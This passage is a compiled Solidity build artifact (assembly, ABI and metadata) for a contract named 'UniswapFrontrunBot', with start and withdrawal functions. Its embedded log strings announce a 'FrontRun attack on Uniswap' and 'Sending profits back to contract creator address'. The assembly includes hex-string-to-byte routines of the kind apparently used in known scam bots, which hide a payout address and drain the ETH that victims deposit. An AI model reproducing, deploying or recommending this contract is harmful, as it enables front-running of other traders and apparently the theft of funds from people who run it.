											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18093,
											"end": 18096,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "130"
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "tag",
											"source": 0,
											"value": "131"
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18174,
											"end": 18175,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 18172,
											"end": 18175,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 18172,
											"end": 18175,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "tag",
											"source": 0,
											"value": "135"
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18179,
											"end": 18190,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 18179,
											"end": 18197,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18177,
											"end": 18178,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18177,
											"end": 18197,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "136"
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18247,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 18248,
											"end": 18249,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "138"
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "tag",
											"source": 0,
											"value": "138"
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 18236,
											"end": 18250,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18228,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 18229,
											"end": 18232,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18229,
											"end": 18232,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 18229,
											"end": 18232,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 18229,
											"end": 18232,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18229,
											"end": 18232,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 18229,
											"end": 18232,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "139"
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "tag",
											"source": 0,
											"value": "139"
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18233,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 18219,
											"end": 18250,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18199,
											"end": 18202,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "135"
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "tag",
											"source": 0,
											"value": "136"
										},
										{
											"begin": 18168,
											"end": 18262,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18289,
											"end": 18298,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "SWAP7",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18275,
											"end": 18299,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 11163,
											"end": 11252,
											"name": "tag",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 11163,
											"end": 11252,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11214,
											"end": 11218,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 11238,
											"end": 11244,
											"name": "PUSH",
											"source": 0,
											"value": "287EF"
										},
										{
											"begin": 11231,
											"end": 11244,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 11231,
											"end": 11244,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11163,
											"end": 11252,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 11163,
											"end": 11252,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 13804,
											"end": 13893,
											"name": "tag",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 13804,
											"end": 13893,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13855,
											"end": 13859,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13879,
											"end": 13885,
											"name": "PUSH",
											"source": 0,
											"value": "8BC81"
										},
										{
											"begin": 13872,
											"end": 13885,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13872,
											"end": 13885,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13804,
											"end": 13893,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13804,
											"end": 13893,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 17278,
											"end": 17366,
											"name": "tag",
											"source": 0,
											"value": "63"
										},
										{
											"begin": 17278,
											"end": 17366,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17328,
											"end": 17332,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 17352,
											"end": 17358,
											"name": "PUSH",
											"source": 0,
											"value": "4D003"
										},
										{
											"begin": 17345,
											"end": 17358,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17345,
											"end": 17358,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17278,
											"end": 17366,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17278,
											"end": 17366,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "tag",
											"source": 0,
											"value": "113"
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15557,
											"end": 15561,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15583,
											"end": 15584,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15584,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 15578,
											"end": 15584,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15579,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15578,
											"end": 15584,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15584,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "144"
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15593,
											"end": 15594,
											"name": "PUSH",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 15588,
											"end": 15589,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15588,
											"end": 15594,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 15588,
											"end": 15594,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15588,
											"end": 15594,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 15588,
											"end": 15594,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "tag",
											"source": 0,
											"value": "144"
										},
										{
											"begin": 15578,
											"end": 15594,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15574,
											"end": 15765,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15574,
											"end": 15765,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "145"
										},
										{
											"begin": 15574,
											"end": 15765,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 15642,
											"end": 15643,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15629,
											"end": 15638,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 15623,
											"end": 15639,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 15623,
											"end": 15639,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 15623,
											"end": 15643,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15618,
											"end": 15644,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 15618,
											"end": 15644,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 15611,
											"end": 15644,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15611,
											"end": 15644,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15611,
											"end": 15644,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "143"
										},
										{
											"begin": 15611,
											"end": 15644,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 15574,
											"end": 15765,
											"name": "tag",
											"source": 0,
											"value": "145"
										},
										{
											"begin": 15574,
											"end": 15765,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15678,
											"end": 15679,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15680,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 15666,
											"end": 15680,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15668,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 15666,
											"end": 15680,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15680,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "147"
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15696,
											"end": 15698,
											"name": "PUSH",
											"source": 0,
											"value": "F"
										},
										{
											"begin": 15690,
											"end": 15691,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15684,
											"end": 15698,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 15684,
											"end": 15698,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15684,
											"end": 15698,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 15684,
											"end": 15698,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "tag",
											"source": 0,
											"value": "147"
										},
										{
											"begin": 15666,
											"end": 15698,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15662,
											"end": 15765,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15662,
											"end": 15765,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "148"
										},
										{
											"begin": 15662,
											"end": 15765,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 15750,
											"end": 15752,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 15746,
											"end": 15747,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15733,
											"end": 15742,
											"name": "PUSH",
											"source": 0,
											"value": "6100000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 15727,
											"end": 15743,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 15727,
											"end": 15743,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 15727,
											"end": 15747,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15727,
											"end": 15752,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15722,
											"end": 15753,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 15722,
											"end": 15753,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 15715,
											"end": 15753,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15715,
											"end": 15753,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15715,
											"end": 15753,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "143"
										},
										{
											"begin": 15715,
											"end": 15753,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 15662,
											"end": 15765,
											"name": "tag",
											"source": 0,
											"value": "148"
										},
										{
											"begin": 15662,
											"end": 15765,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "tag",
											"source": 0,
											"value": "143"
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15505,
											"end": 15832,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									],
									".data": {
										"6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
										"A605A138A70F3AE4D1364B0A4BE28F180D3F021084227D7F914F61C97FB6A66E": "52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2e"
									}
								}
							}
						},
						"methodIdentifiers": {
							"start()": "be9a6555",
							"tokenName()": "6c02a931",
							"tokenSymbol()": "7b61c320",
							"withdrawal()": "d4e93292"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_tokenName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_tokenSymbol\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"Frontrun Bot.sol\":\"UniswapFrontrunBot\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"Frontrun Bot.sol\":{\"keccak256\":\"0x74e35dfcaa67c9cef8edd8b8de4b3cefefd49707f6a587b1a02fa2aadf56eec7\",\"urls\":[\"bzz-raw://9bd66a9f1e37db0415cc4912b1054bafcda5b2ef542ec6e04cd3f39ceb76e65b\",\"dweb:/ipfs/QmV3FXxemBD6Lqu3ZVAyUiS7Sds5tp3asd6tyr9j34GLmU\"]},\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\":{\"keccak256\":\"0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124\",\"urls\":[\"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da\",\"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8\"]},\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\":{\"keccak256\":\"0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b\",\"urls\":[\"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65\",\"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi\"]},\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\":{\"keccak256\":\"0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589\",\"urls\":[\"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6\",\"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 6,
								"contract": "Frontrun Bot.sol:UniswapFrontrunBot",
								"label": "tokenName",
								"offset": 0,
								"slot": "0",
								"type": "t_string_storage"
							},
							{
								"astId": 8,
								"contract": "Frontrun Bot.sol:UniswapFrontrunBot",
								"label": "tokenSymbol",
								"offset": 0,
								"slot": "1",
								"type": "t_string_storage"
							},
							{
								"astId": 10,
								"contract": "Frontrun Bot.sol:UniswapFrontrunBot",
								"label": "frontrun",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol": {
				"IUniswapV2Migrator": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "token",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amountTokenMin",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amountETHMin",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								}
							],
							"name": "migrate",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"migrate(address,uint256,uint256,address,uint256)": "b7df1d25"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETHMin\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"migrate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\":\"IUniswapV2Migrator\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\":{\"keccak256\":\"0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124\",\"urls\":[\"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da\",\"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"IUniswapV1Exchange": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "ethToTokenSwapInput",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "removeLiquidity",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "tokenToEthSwapInput",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
